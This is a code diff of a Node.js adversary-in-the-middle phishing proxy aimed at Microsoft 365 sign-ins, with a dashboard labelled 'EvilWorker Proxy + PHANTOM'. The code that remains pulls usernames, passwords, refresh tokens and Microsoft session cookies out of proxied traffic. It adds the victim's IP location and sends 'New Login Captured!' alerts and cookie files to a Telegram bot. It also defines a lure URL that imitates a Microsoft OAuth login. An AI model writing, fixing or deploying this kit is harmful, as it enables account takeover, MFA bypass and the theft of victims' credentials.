@@ -91,7 +91,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FULLY FIXED)
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
 // ================================================
 
 async function sendToTelegram(data) {
@@ -102,20 +102,12 @@ async function sendToTelegram(data) {
         const sessionId = data.sessionId || 'unknown';
         const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
         
-        console.log('📨 sendToTelegram() CALLED with URL:', url);
-        
         // ────── CHECK IF ALREADY NOTIFIED ──────
         if (NOTIFIED_SESSIONS.has(sessionId)) {
-            console.log('⏭️ Already notified for session:', sessionId);
             return;
         }
         
-        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
-                   data.proxyRequestHeaders?.['x-real-ip'] || 
-                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
-                   'Unknown';
-
-        // ────── CHECK FOR CREDENTIALS (BETTER PARSING) ──────
+        // ────── CHECK FOR CREDENTIALS ──────
         let username = 'N/A';
         let password = 'N/A';
         let hasCredentials = false;
@@ -125,7 +117,6 @@ async function sendToTelegram(data) {
         if (body) {
             const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
             
-            // ── MICROSOFT SPECIFIC PATTERNS ──
             const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
             if (userMatch) {
                 username = decodeURIComponent(userMatch[1]);
@@ -139,27 +130,7 @@ async function sendToTelegram(data) {
             
             if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                 isTokenExchange = true;
-                const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
-                if (refreshMatch) {
-                    hasCredentials = true;
-                }
-            }
-            
-            if (bodyStr.includes('code=') && bodyStr.includes('client_id=')) {
-                isTokenExchange = true;
                 hasCredentials = true;
-                const codeMatch = bodyStr.match(/code=([^&]+)/i);
-                if (codeMatch) {
-                    password = 'AUTH_CODE: ' + decodeURIComponent(codeMatch[1]).slice(0, 30) + '...';
-                }
-            }
-            
-            if (bodyStr.includes('SAMLResponse') || bodyStr.includes('SAMLRequest')) {
-                hasCredentials = true;
-                const samlMatch = bodyStr.match(/SAMLResponse=([^&]+)/i);
-                if (samlMatch) {
-                    password = 'SAML: ' + decodeURIComponent(samlMatch[1]).slice(0, 40) + '...';
-                }
             }
         }
         
@@ -169,38 +140,25 @@ async function sendToTelegram(data) {
             const cookieStr = JSON.stringify(setCookieHeaders);
             if (cookieStr.includes('esctx') || 
                 cookieStr.includes('ESTSAUTH') || 
-                cookieStr.includes('LoginOptions') ||
-                cookieStr.includes('.AspNetCore')) {
+                cookieStr.includes('LoginOptions')) {
                 isSessionCookie = true;
                 hasCredentials = true;
             }
         }
         
-        // ────── CHECK FOR ACCESS TOKEN IN RESPONSE ──────
-        if (data.proxyResponseBody) {
-            const respStr = typeof data.proxyResponseBody === 'string' ? 
-                data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
-            if (respStr.includes('access_token') && respStr.includes('token_type')) {
-                hasCredentials = true;
-                isTokenExchange = true;
-                const tokenMatch = respStr.match(/"access_token":"([^"]+)"/);
-                if (tokenMatch) {
-                    username = 'ACCESS_TOKEN: ' + tokenMatch[1].slice(0, 20) + '...';
-                }
-            }
-        }
-        
         // ────── SKIP IF NOTHING VALUABLE ──────
         if (!hasCredentials) {
-            console.log('⏭️ Skipping notification - no credentials found in:', url);
             return;
         }
-        
-        console.log('✅ Valid credentials found, sending notification...');
         
         // ────── MARK AS NOTIFIED ──────
         NOTIFIED_SESSIONS.add(sessionId);
         
+        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                   data.proxyRequestHeaders?.['x-real-ip'] || 
+                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
+
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
         let location = 'Unknown';
@@ -211,7 +169,6 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
-        // ────── BUILD MESSAGE ──────
         let message = `
 🔐 **New Login Captured!**
 
@@ -234,13 +191,9 @@ ${flag} **Location:** ${location}
             `;
         }
         
-        if (password !== 'N/A' && !password.includes('AUTH_CODE') && !password.includes('SAML')) {
+        if (password !== 'N/A') {
             message += `
 🔐 **Password:** ${password}
-            `;
-        } else if (password !== 'N/A') {
-            message += `
-🔑 **Token/Code:** ${password}
             `;
         }
 
@@ -258,39 +211,19 @@ ${flag} **Location:** ${location}
             `;
         }
 
-        // ────── SEND TELEGRAM ──────
-        console.log('📤 Sending Telegram message...');
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
-        console.log('✅ Telegram message sent successfully');
 
-        // ────── SEND COOKIES AS FILE ──────
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies && Object.keys(cookies).length > 0) {
             await sendCookiesAsFile(cookies, sessionId);
         }
 
-        // ────── ALSO SEND RAW DATA ──────
-        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
-            try {
-                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    chat_id: CHAT_ID,
-                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
-                    parse_mode: 'Markdown'
-                });
-                console.log('✅ Raw data sent successfully');
-            } catch (e) {
-                console.log('⚠️ Raw data send failed:', e.message);
-            }
-        }
-
     } catch (e) {
         console.error('❌ Telegram send failed:', e.message);
-        console.error('   Stack:', e.stack);
-        // Don't mark as notified on failure so we retry later
     }
 }
 
@@ -380,10 +313,12 @@ const AdmZip = require('adm-zip');
 const WebSocket = require('ws');
 
 // ================================================
-// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂
+// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED: ALL DEFINED IN CORRECT ORDER)
 // ================================================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code%20id_token&scope=openid%20profile%20https://www.office.com/v2/OfficeHome.All&response_mode=form_post&nonce=639184844564570154.NDIzMzYyMTYtYzEyZS00ZTNmLWJlM2UtZDI0MGFmMTdkMTRkNzJkODEwOGYtODRlNy00ZWQzLThmMDEtZGZmYmFhZDZmZTBj&ui_locales=en-US&mkt=en-US&client-request-id=99379295-ecc3-42d6-8cfe-e9de1e49c6a1&state=B0S749VD98HA5Y5KTe0Kjmc4eph0juVCpGmq153DAYfuPP79sGWMIdy-VI75usEW_JhqYmm8cTD0Pr-CjdUDRCWypSmOo7AI2jdia0qjncRq7FBaDuf3gZpxeD_3CIp-YbnHTslCw_oeuxXecQQRT_0vyN46jFzpCqltmqrY0FT4y3DH_71nqoFOju_4TTJ4EJSrIZ05qruAY9WN1lKueZ8Jlaexwf3xdp5Cu7dFuqPFudCxOwGJgYKLLbzv1RBT1ZBJLQlZ3Xb8VAnqiwxQO00sblmXByCEyq8xdeRYBZl0tDzhjJ46PfdB7jITCDdrlrcndSN7y-UwfCgrMlwmsVri0yoRyLFVZ3UMLzaiDxU5jdn8rAK9GxmRZow2KZtVexj3qLt1osb_2lI8DQxDnxsJmaRsw5vMfn3TA1zWiZw&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0&sso_reload=true";
+
+const PHISHED_URL_PARAMETER = "redirect_urI";  // ✅ FIXED: Defined before use
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
 
@@ -1140,24 +1075,6 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
     }
 });
 
-dashApp.post('/api/test-telegram', async (req, res) => {
-    try {
-        const testData = {
-            timestamp: new Date().toISOString(),
-            proxyRequestURL: 'https://login.microsoftonline.com/test',
-            proxyRequestMethod: 'GET',
-            proxyRequestHeaders: { 'user-agent': 'Test' },
-            proxyRequestBody: 'test=123',
-            proxyResponseStatusCode: 200,
-            proxyResponseHeaders: { 'set-cookie': ['test=value'] }
-        };
-        await sendToTelegram(testData);
-        res.json({ success: true, message: 'Test notification sent' });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
 // ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
 // ================================================
@@ -1417,7 +1334,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 
 // ================================================
-// 𝙼𝙰𝙺𝙴 𝙿𝚁𝙾𝚇𝚈 𝚁𝙴𝚀𝚄𝙴𝚂𝚃 (FIXED: AWAIT + ERROR HANDLING)
+// 𝙼𝙰𝙺𝙴 𝙿𝚁𝙾𝚇𝚈 𝚁𝙴𝚀𝚄𝙴𝚂𝚃
 // ================================================
 
 const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
@@ -1616,18 +1533,10 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
     
-    // ────── FIXED: AWAIT + ERROR HANDLING ──────
     try {
         await sendToTelegram(httpProxyTransaction);
-        console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
     } catch (telegramError) {
         console.error('❌ Telegram notification FAILED:', telegramError.message);
-        console.error('   URL:', httpProxyTransaction.proxyRequestURL);
-        // Log to error file
-        try {
-            fs.appendFileSync('telegram_errors.log', 
-                `[${new Date().toISOString()}] ${telegramError.message} | ${httpProxyTransaction.proxyRequestURL}\n`);
-        } catch (e) {}
     }
 }
 
@@ -2133,7 +2042,6 @@ const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
     console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
-    console.log(`📱 Telegram bot configured: ${BOT_TOKEN.slice(0, 10)}...`);
 });
 
 const wss = new WebSocket.Server({ server });
